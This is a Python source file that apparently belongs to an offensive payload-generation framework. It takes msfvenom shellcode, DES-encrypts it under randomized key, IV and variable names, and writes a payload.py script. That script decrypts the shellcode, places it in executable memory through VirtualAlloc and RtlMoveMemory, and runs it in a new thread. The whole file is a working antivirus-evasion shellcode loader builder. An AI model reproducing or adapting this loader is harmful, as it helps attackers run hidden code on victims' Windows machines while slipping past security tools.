# Great examples and code adapted from 
# http://www.laurentluce.com/posts/python-and-cryptography-with-pycrypto/

# Import Modules
import random
import string
from Crypto.Cipher import DES
from modules.auxiliary import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import supportfiles

def pyDESVAlloc():
    # Generate Shellcode Using msfvenom
    Shellcode = shellcode.genShellcode()

    # Generate Random Variable Names
    RandPtr = randomizer.randomString()
    RandBuf = randomizer.randomString()
    RandHt = randomizer.randomString()
    ShellcodeVariableName = randomizer.randomString()
    RandIV = randomizer.randomString()
    RandDESKey = randomizer.randomString()
    RandDESPayload = randomizer.randomString()
    RandEncShellCodePayload = randomizer.randomString()

    # Set IV Value and DES Key
    iv = ''.join(random.choice(string.ascii_letters) for x in range(8))
    DESKey = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(8))

    # Create DES Object and encrypt our payload
    desmain = DES.new(DESKey, DES.MODE_CFB, iv)
    EncShellCode = desmain.encrypt(Shellcode)

    # Create Payload File
    PayloadFile = open('payload.py', 'w')
    PayloadFile.write('#!/usr/bin/python\n\n')
    PayloadFile.write('from Crypto.Cipher import DES\n')
    PayloadFile.write('import ctypes\n\n')
    PayloadFile.write(RandIV + ' = \'' + iv + '\'\n')
    PayloadFile.write(RandDESKey + ' = \'' + DESKey + '\'\n')
    PayloadFile.write(RandDESPayload + ' = DES.new(' + RandDESKey + ', DES.MODE_CFB, ' + RandIV + ')\n\n')
    PayloadFile.write(RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n\n')
    PayloadFile.write(ShellcodeVariableName + ' = bytearray(' + RandDESPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n')
    PayloadFile.write(RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n\n')
    PayloadFile.write(RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n\n')
    PayloadFile.write('ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n\n')
    PayloadFile.write(RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n\n')
    PayloadFile.write('ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))')
    PayloadFile.close()

    # Create Supporting Files and Print Exit Message
    supportfiles.supportingFiles()
    messages.endmsg()
